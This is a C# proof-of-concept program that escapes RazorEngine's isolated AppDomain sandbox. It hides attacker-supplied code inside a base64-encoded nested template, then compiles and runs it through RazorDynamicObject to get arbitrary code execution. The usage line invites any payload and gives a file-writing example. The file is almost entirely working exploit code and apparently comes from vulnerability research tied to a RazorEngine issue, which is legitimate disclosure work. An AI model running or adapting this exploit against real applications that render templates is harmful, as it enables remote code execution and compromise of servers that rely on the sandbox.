using System;
using System.IO;
using System.Linq;
using System.Security.Policy;
using System.Security;
using RazorEngine;
using RazorEngine.Configuration;
using RazorEngine.Templating;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Web.Razor;

namespace Poc
{
    internal class Program
    {
        // See: https://antaris.github.io/RazorEngine/Isolation.html
        private static AppDomain SandboxCreator()
        {
            Evidence ev = new Evidence();
            ev.AddHostEvidence(new Zone(SecurityZone.Internet));
            PermissionSet permSet = SecurityManager.GetStandardSandbox(ev);
            // We have to load ourself with full trust
            StrongName razorEngineAssembly = typeof(RazorEngineService).Assembly.Evidence.GetHostEvidence<StrongName>();
            // We have to load Razor with full trust (so all methods are SecurityCritical)
            // This is because we apply AllowPartiallyTrustedCallers to RazorEngine, because
            // We need the untrusted (transparent) code to be able to inherit TemplateBase.
            // Because in the normal environment/appdomain we run as full trust and the Razor assembly has no security attributes
            // it will be completely SecurityCritical. 
            // This means we have to mark a lot of our members SecurityCritical (which is fine).
            // However in the sandbox domain we have partial trust and because razor has no Security attributes that means the
            // code will be transparent (this is where we get a lot of exceptions, because we now have different security attributes)
            // To work around this we give Razor full trust in the sandbox as well.
            StrongName razorAssembly = typeof(RazorTemplateEngine).Assembly.Evidence.GetHostEvidence<StrongName>();
            AppDomainSetup adSetup = new AppDomainSetup();
            adSetup.DisallowCodeDownload = true;
            adSetup.ApplicationBase = AppDomain.CurrentDomain.SetupInformation.ApplicationBase;
            AppDomain newDomain = AppDomain.CreateDomain("Sandbox", null, adSetup, permSet, razorEngineAssembly, razorAssembly);
            return newDomain;
        }

        // See: https://github.com/Antaris/RazorEngine/issues/585
        private static void IsolatedRazorEngineService_BadTemplate_InSandbox(string template)
        {
            using (var service = IsolatedRazorEngineService.Create(SandboxCreator))
            {
                service.RunCompile(template, "poc");
            }
        }

        private static string CreateNestedTemplate(string initialTemplate)
        {
            // An encoded version of our template to prevent issues with special characters
            byte[] base64Bytes = System.Text.Encoding.UTF8.GetBytes(initialTemplate);
            string base64String = Convert.ToBase64String(base64Bytes);

            return $@"
                @using RazorEngine;
                @using RazorEngine.Templating;
                @{{
                    var base64EncodedBytes = System.Convert.FromBase64String(""{base64String}"");
                    var template = System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
                    var result = Engine.Razor.RunCompile(template, ""poc"", null, new {{ N = ""empty"" }});
                }}";
        }

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: poc.exe \"<payload>\"");
                Console.WriteLine("Example: poc.exe \"System.IO.File.WriteAllText(\"rce.txt\", \"Hello World\");\"");
                Environment.Exit(0);
            }

            string input = args[0];
            //Console.WriteLine(input);

            string initialTemplate = $@"
                @using System.IO
                @using RC = RazorEngine.Compilation
                @{{
                    System.Linq.Expressions.Expression<System.Action> exp = () => {input}
                    dynamic d = (RC.RazorDynamicObject)RC.RazorDynamicObject.Create(exp);
                    System.Action a = d.Compile();
                    a();
                }}";

            var nestedTemplate = CreateNestedTemplate(initialTemplate);

            // Remove this comment to test the template
            IsolatedRazorEngineService_BadTemplate_InSandbox(nestedTemplate);

            Console.WriteLine(nestedTemplate);
        }
    }
}